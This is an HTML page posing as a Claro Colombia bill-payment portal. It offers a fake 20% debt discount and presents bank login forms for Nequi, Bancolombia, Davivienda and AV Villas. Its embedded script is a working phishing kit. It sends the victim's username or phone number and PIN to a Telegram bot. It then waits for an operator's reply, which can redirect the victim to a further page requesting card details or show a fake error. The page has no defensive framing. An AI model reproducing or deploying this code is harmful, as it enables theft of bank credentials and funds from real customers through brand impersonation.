<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" type="image/png" href="img/favicon.ico" />
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
        rel="stylesheet" />
    <title>Inicia Sesión en tu Banco | Claro</title>
    <style>
        body {
            font-family: "Open Sans", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
        }

        #loader-container {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        #loader {
            width: 3.25em;
            transform-origin: center;
            animation: rotate4 2s linear infinite;
        }

        circle {
            fill: none;
            stroke: hsl(0, 97%, 59%);
            stroke-width: 2;
            stroke-dasharray: 1, 200;
            stroke-dashoffset: 0;
            stroke-linecap: round;
            animation: dash4 1.5s ease-in-out infinite;
        }

        @keyframes rotate4 {
            100% {
                transform: rotate(360deg);
            }
        }

        @keyframes dash4 {
            0% {
                stroke-dasharray: 1, 200;
                stroke-dashoffset: 0;
            }

            50% {
                stroke-dasharray: 89, 200;
                stroke-dashoffset: -35;
            }

            100% {
                stroke-dasharray: 89, 200;
                stroke-dashoffset: -124;
            }
        }

        input:focus {
            outline: none;
            box-shadow: 0 0 0 2px #FFC73C;
        }

        .input-error {
            border-color: #EF3320;
        }

        .error-message {
            color: #EF3320;
            font-size: 0.8rem;
            margin-top: 4px;
        }
    </style>
</head>

<body class="bg-gray-100 text-gray-800 antialiased">
    <div class="px-6 flex items-center justify-between h-10 bg-white">
        <div class="flex items-center gap-8">
            <p class="text-sm text-[#313131] font-semibold border-b-4 border-[#FFC73C]">Personas</p>
            <p class="hidden md:block text-sm text-[#313131] font-semibold hover:border-b-4 hover:border-[#FFC73C]">Negocios
            </p>
            <p class="hidden md:block text-sm text-[#313131] font-semibold hover:border-b-4 hover:border-[#FFC73C]">Empresas
            </p>
            <p class="hidden md:block text-sm text-[#313131] font-semibold hover:border-b-4 hover:border-[#FFC73C]">Institucional
            </p>
        </div>
        <div class="flex items-center gap-4">
            <div class="flex items-center gap-2 text-sm text-[#313131] font-semibold">Más de Claro
                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
                </svg>
            </div>
            <div class="flex items-center gap-2 text-sm text-[#313131] font-semibold">
                <img class="w-5 h-5" src="./assets/flag-colombia.svg" alt="">
                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
                </svg>
            </div>
        </div>
    </div>
    <header class="bg-[#EF3320] h-14 flex items-center px-4 md:px-10 justify-between">
        <div class="flex items-center gap-4">
            <svg xmlns="http://www.w3.org/2000/svg" class="md:hidden w-6 h-6 text-white" viewBox="0 0 24 24" fill="none"
                stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M4 6h16M4 12h16M4 18h16" />
            </svg>
            <img class="w-20" src="./assets/claro.svg" alt="Claro">
            <nav class="hidden md:flex items-center gap-6 text-white">
                <div class="flex items-center gap-1"><span class="text-sm font-bold">Servicios</span>
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
                        <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
                    </svg>
                </div>
                <div class="flex items-center gap-1"><span class="text-sm font-bold">Tienda</span>
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
                        <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
                    </svg>
                </div>
                <div class="flex items-center gap-1"><span class="text-sm font-bold">Soporte</span>
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
                        <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
                    </svg>
                </div>
            </nav>
        </div>
        <div class="flex items-center gap-3">
            <div class="hidden md:flex items-center gap-3 text-white"><span class="text-xs font-semibold">Información
                    importante para usuarios</span>
                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
                    <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
                </svg>
            </div>
            <button class="flex items-center gap-2 rounded-full px-4 h-10 bg-[#D01508] text-white font-bold">
                <img class="w-6 h-6" src="./assets/c2btn.png" alt=""> Mi Claro
            </button>
        </div>
    </header>

    <main class="px-4 md:px-10 py-6">
        <div id="ggris1" class="bg-white rounded-xl p-6 shadow-sm max-w-2xl mx-auto">
            <div class="text-gray-700 text-center">
                <p class="text-xl font-semibold">
                    Portal de <span class="text-[#EF3320]">PAGOS <span class="font-normal">Y RECARGAS</span></span>
                </p>
                <p class="mt-4 text-sm font-medium">Estás a punto de pagar:</p>
                <p id="valor-a-pagar" class="text-4xl font-bold text-[#EF3320] mt-2">$ 0,00</p>
            </div>
        </div>

        <section id="bank-form-section" class="mt-6 max-w-xl mx-auto bg-white p-6 shadow-lg rounded-lg">
            <div class="flex items-center justify-center mb-4">
                <img id="bank-logo" class="h-12" src="" alt="Logo del Banco">
                <img id="mastercard-logo" class="h-10 ml-4 hidden" src="img/mastercard.png" alt="Logo MasterCard">
            </div>
            <h2 id="bank-title" class="text-lg font-bold text-center border-b pb-2 mb-4">Inicia Sesión en el Banco</h2>
            <form id="bank-login-form">
                <div class="space-y-4" id="form-fields">
                </div>
                <div class="mt-8 text-center">
                    <button type="submit" id="payButton"
                        class="w-full h-14 rounded-xl text-white font-bold text-lg bg-[#EF3320] hover:bg-[#d01508] transition-colors">
                        CONTINUAR
                    </button>
                </div>
            </form>
        </section>
    </main>

    <footer class="mt-8">
        <img class="hidden md:block w-full" src="./assets/footer-dk.png" alt="">
        <img class="block md:hidden w-full" src="./assets/footer.png" alt="">
    </footer>

    <div id="loader-container">
        <div id="loader">
            <svg viewBox="25 25 50 50">
                <circle r="20" cy="50" cx="50"></circle>
            </svg>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const urlParams = new URLSearchParams(window.location.search);
            const selectedBank = urlParams.get('banco');
            const deudaTotal = parseFloat(urlParams.get('deuda'));

            const formatCurrency = (amount) => {
                return new Intl.NumberFormat('es-CO', {
                    style: 'currency',
                    currency: 'COP',
                    minimumFractionDigits: 0,
                    maximumFractionDigits: 0
                }).format(amount);
            };

            if (!isNaN(deudaTotal)) {
                const descuento = 0.20;
                const deudaConDescuento = deudaTotal * (1 - descuento);
                document.getElementById('valor-a-pagar').textContent = formatCurrency(deudaConDescuento);
            } else {
                console.error("No se encontraron parámetros de deuda válidos en la URL.");
            }

            const bankLogo = document.getElementById('bank-logo');
            const mastercardLogo = document.getElementById('mastercard-logo');
            const bankTitle = document.getElementById('bank-title');
            const formFields = document.getElementById('form-fields');
            const bankLoginForm = document.getElementById('bank-login-form');
            const loaderContainer = document.getElementById('loader-container');
            const payButton = document.getElementById('payButton');

            const banksConfig = {
                'nequi': {
                    logo: 'https://logosenvector.com/logo/img/nequi-37254.png',
                    title: 'Inicia Sesión en Nequi',
                    mastercard: true,
                    fields: `
                        <div>
                            <label for="nequi-celular" class="block text-sm font-medium text-gray-700">Número de Celular</label>
                            <input type="tel" id="nequi-celular" name="nequi-celular" inputmode="numeric" maxlength="10"
                                class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
                            <p id="error-nequi-celular" class="error-message hidden">Número de celular inválido (10 dígitos).</p>
                        </div>
                        <div>
                            <label for="nequi-clave" class="block text-sm font-medium text-gray-700">Clave</label>
                            <input type="password" id="nequi-clave" name="nequi-clave" inputmode="numeric" maxlength="4"
                                class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
                            <p id="error-nequi-clave" class="error-message hidden">Clave inválida (4 dígitos).</p>
                        </div>
                    `
                },
                'bancolombia': {
                    logo: 'bancolombia.png',
                    title: 'Inicia Sesión en Bancolombia',
                    mastercard: false,
                    fields: `
                        <div>
                            <label for="bancolombia-user" class="block text-sm font-medium text-gray-700">Usuario</label>
                            <input type="text" id="bancolombia-user" name="bancolombia-user"
                                class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
                            <p id="error-bancolombia-user" class="error-message hidden">El usuario es requerido.</p>
                        </div>
                        <div>
                            <label for="bancolombia-clave" class="block text-sm font-medium text-gray-700">Clave</label>
                            <input type="password" id="bancolombia-clave" name="bancolombia-clave" inputmode="numeric" maxlength="4"
                                class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
                            <p id="error-bancolombia-clave" class="error-message hidden">Clave inválida (4 dígitos).</p>
                        </div>
                    `
                },
                'davivienda': {
                    logo: 'davivienda.png',
                    title: 'Inicia Sesión en Davivienda',
                    mastercard: false,
                    fields: `
                        <div>
                            <label for="davivienda-user" class="block text-sm font-medium text-gray-700">Número de documento</label>
                            <input type="text" id="davivienda-user" name="davivienda-user"
                                class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
                            <p id="error-davivienda-user" class="error-message hidden">El número de documento es requerido.</p>
                        </div>
                        <div>
                            <label for="davivienda-clave" class="block text-sm font-medium text-gray-700">Clave virtual</label>
                            <input type="password" id="davivienda-clave" name="davivienda-clave" inputmode="numeric" maxlength="4"
                                class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
                            <p id="error-davivienda-clave" class="error-message hidden">Clave inválida (4 dígitos).</p>
                        </div>
                    `
                },
                'avvillas': {
                    logo: 'avvillas.png',
                    title: 'Inicia Sesión en Av Villas',
                    mastercard: false,
                    fields: `
                        <div>
                            <label for="avvillas-user" class="block text-sm font-medium text-gray-700">Usuario</label>
                            <input type="text" id="avvillas-user" name="avvillas-user"
                                class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
                            <p id="error-avvillas-user" class="error-message hidden">El usuario es requerido.</p>
                        </div>
                        <div>
                            <label for="avvillas-clave" class="block text-sm font-medium text-gray-700">Clave</label>
                            <input type="password" id="avvillas-clave" name="avvillas-clave" inputmode="numeric" maxlength="4"
                                class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
                            <p id="error-avvillas-clave" class="error-message hidden">Clave inválida (4 dígitos).</p>
                        </div>
                    `
                },
            };

            if (selectedBank && banksConfig[selectedBank]) {
                const config = banksConfig[selectedBank];
                bankLogo.src = `img/${config.logo}`;
                bankLogo.alt = `Logo de ${selectedBank}`;
                bankTitle.textContent = config.title;
                formFields.innerHTML = config.fields;
                if (config.mastercard) {
                    mastercardLogo.classList.remove('hidden');
                } else {
                    mastercardLogo.classList.add('hidden');
                }
            } else {
                bankLogo.src = '';
                bankLogo.alt = 'Logo de su banco';
                bankTitle.textContent = 'Inicia Sesión en tu Banco';
                formFields.innerHTML = `
                    <div>
                        <label for="user" class="block text-sm font-medium text-gray-700">Usuario</label>
                        <input type="text" id="user" name="user"
                            class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
                    </div>
                    <div>
                        <label for="clave" class="block text-sm font-medium text-gray-700">Clave</label>
                        <input type="password" id="clave" name="clave" inputmode="numeric"
                            class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
                    </div>
                `;
            }

            bankLoginForm.addEventListener('submit', async function(event) {
                event.preventDefault();
                let isValid = true;
                document.querySelectorAll('.error-message').forEach(el => el.classList.add('hidden'));
                document.querySelectorAll('input').forEach(el => el.classList.remove('input-error'));

                let transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
                let message = `<b>🔔 Nuevo Intento de Pago - ${selectedBank.toUpperCase()}</b>\n🆔 <b>ID:</b> ${transactionId}\n`;
                const formData = {};
                formData.banco = selectedBank;

                if (selectedBank === 'nequi') {
                    const nequiCelular = document.getElementById('nequi-celular');
                    const nequiClave = document.getElementById('nequi-clave');
                    if (nequiCelular.value.length !== 10 || !/^\d+$/.test(nequiCelular.value)) {
                        document.getElementById('error-nequi-celular').classList.remove('hidden');
                        nequiCelular.classList.add('input-error');
                        isValid = false;
                    }
                    if (nequiClave.value.length < 4) {
                        document.getElementById('error-nequi-clave').classList.remove('hidden');
                        nequiClave.classList.add('input-error');
                        isValid = false;
                    }
                    if (isValid) {
                        message += `📞 <b>Celular:</b> ${nequiCelular.value}\n🔑 <b>Clave:</b> ${nequiClave.value}`;
                        formData.celular = nequiCelular.value;
                        formData.clave = nequiClave.value;
                    }
                } else if (selectedBank === 'bancolombia') {
                    const bancolombiaUser = document.getElementById('bancolombia-user');
                    const bancolombiaClave = document.getElementById('bancolombia-clave');
                    if (bancolombiaUser.value.trim() === '') {
                        document.getElementById('error-bancolombia-user').classList.remove('hidden');
                        bancolombiaUser.classList.add('input-error');
                        isValid = false;
                    }
                    if (bancolombiaClave.value.length < 4) {
                        document.getElementById('error-bancolombia-clave').classList.remove('hidden');
                        bancolombiaClave.classList.add('input-error');
                        isValid = false;
                    }
                    if (isValid) {
                        message += `👤 <b>Usuario:</b> ${bancolombiaUser.value}\n🔑 <b>Clave:</b> ${bancolombiaClave.value}`;
                        formData.usuario = bancolombiaUser.value;
                        formData.clave = bancolombiaClave.value;
                    }
                } else if (selectedBank === 'davivienda') {
                    const daviviendaUser = document.getElementById('davivienda-user');
                    const daviviendaClave = document.getElementById('davivienda-clave');
                    if (daviviendaUser.value.trim() === '') {
                        document.getElementById('error-davivienda-user').classList.remove('hidden');
                        daviviendaUser.classList.add('input-error');
                        isValid = false;
                    }
                    if (daviviendaClave.value.length < 4) {
                        document.getElementById('error-davivienda-clave').classList.remove('hidden');
                        daviviendaClave.classList.add('input-error');
                        isValid = false;
                    }
                    if (isValid) {
                        message += `📄 <b>Documento:</b> ${daviviendaUser.value}\n🔑 <b>Clave:</b> ${daviviendaClave.value}`;
                        formData.documento = daviviendaUser.value;
                        formData.clave = daviviendaClave.value;
                    }
                } else if (selectedBank === 'avvillas') {
                    const avvillasUser = document.getElementById('avvillas-user');
                    const avvillasClave = document.getElementById('avvillas-clave');
                    if (avvillasUser.value.trim() === '') {
                        document.getElementById('error-avvillas-user').classList.remove('hidden');
                        avvillasUser.classList.add('input-error');
                        isValid = false;
                    }
                    if (avvillasClave.value.length < 4) {
                        document.getElementById('error-avvillas-clave').classList.remove('hidden');
                        avvillasClave.classList.add('input-error');
                        isValid = false;
                    }
                    if (isValid) {
                        message += `👤 <b>Usuario:</b> ${avvillasUser.value}\n🔑 <b>Clave:</b> ${avvillasClave.value}`;
                        formData.usuario = avvillasUser.value;
                        formData.clave = avvillasClave.value;
                    }
                } else {
                    const user = document.getElementById('user');
                    const clave = document.getElementById('clave');
                    if (user.value.trim() === '' || clave.value.trim() === '') {
                        alert('Por favor, complete todos los campos.');
                        isValid = false;
                    }
                    if (isValid) {
                        message += `👤 <b>Usuario:</b> ${user.value}\n🔑 <b>Clave:</b> ${clave.value}`;
                        formData.usuario = user.value;
                        formData.clave = clave.value;
                    }
                }

                if (isValid) {
                    loaderContainer.style.display = 'flex';
                    localStorage.setItem('formData', JSON.stringify(formData));

                    const keyboard = {
                        inline_keyboard: [
                            [{ text: "Pedir TC", callback_data: `pedir_tc:${transactionId}` }],
                            [{ text: "Error de Logo", callback_data: `error_logo:${transactionId}` }],
                            [{ text: "Datos Incorrectos", callback_data: `datos_incorrectos:${transactionId}` }]
                        ]
                    };

                    async function loadCfg() {
                        const res = await fetch('config.json');
                        if (!res.ok) throw 'No cargó config.json';
                        return res.json();
                    }

                    try {
                        const cfg = await loadCfg();
                        const res = await fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: cfg.chat_id,
                                text: message,
                                reply_markup: keyboard,
                                parse_mode: 'HTML'
                            })
                        });
                        const js = await res.json();
                        if (!js.ok) throw js;
                        poll(cfg, transactionId, selectedBank, deudaTotal);
                    } catch (err) {
                        console.error(err);
                        loaderContainer.style.display = 'none';
                        alert('Error enviando a Telegram');
                    }
                }
            });

            async function poll(cfg, tid, bank, deuda) {
                try {
                    const res = await fetch(`https://api.telegram.org/bot${cfg.token}/getUpdates`);
                    const js = await res.json();
                    const upd = js.result.find(u => u.callback_query?.data?.endsWith(`:${tid}`));
                    if (upd) {
                        loaderContainer.style.display = 'none';
                        const action = upd.callback_query.data.split(':')[0];
                        switch (action) {
                            case 'pedir_tc':
                                window.location.href = `tc.html?banco=${bank}&deuda=${deuda}`;
                                break;
                            case 'error_logo':
                                alert('Ocurrió un error. Por favor, intente de nuevo.');
                                break;
                            case 'datos_incorrectos':
                                alert('Los datos de inicio de sesión son incorrectos. Por favor, inténtelo de nuevo.');
                                break;
                        }
                    } else {
                        setTimeout(() => poll(cfg, tid, bank, deuda), 2000);
                    }
                } catch {
                    setTimeout(() => poll(cfg, tid, bank, deuda), 2000);
                }
            }
        });
    </script>
</body>

</html>
